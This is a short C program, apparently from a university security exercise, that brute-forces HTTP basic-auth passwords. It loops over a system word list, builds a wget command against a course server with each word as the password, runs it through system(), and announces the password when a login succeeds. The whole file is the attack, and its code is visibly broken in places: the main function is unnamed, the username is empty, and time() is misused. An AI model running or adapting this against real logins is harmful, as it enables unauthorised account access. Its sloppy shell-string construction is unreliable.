

#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/time.h>
#include<string.h>
int ()
{
char a[100];
int count=0;
char ch;
char line[100];
char filename[50];
char *token;
const char delimiter[]=" \n.,;:!-";
FILE *fp;
int  total_time,start_time,end_time;
start_time = time();
strcpy(filename,"/usr/share/lib/dict/words");
if((fp=fopen(filename,"r"))==NULL){
printf("cannot open file\n");
exit(1);
}
while((fgets(line,sizeof(line),fp))!=NULL)
{
        token=strtok(line,delimiter); 
        while(token!=NULL)
                {
            count++;
	    printf("ATTEMPT : %d\n",count);
strcpy(a,"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php --http-user= --http-passwd=");
                strcat(a,token);                
                printf("The request %s\n",a); 
                if(system(a)==0)
		{
		printf("Congratulations!!!Password obtained using DICTIONARY ATTACK\n");
		printf("************************************************************\n");
		printf("Your password is %s\n",token);
		printf("The Request sent is %s \n",a);
                end_time = time();
                total_time = (end_time -start_time);
                total_time /= 1000000000.0;
                printf("The Time Taken is : %llds\n",total_time);
		exit(1);
		}

              
                token=strtok(NULL,delimiter);
                
                 }
}


fclose(fp);
return 0;
}
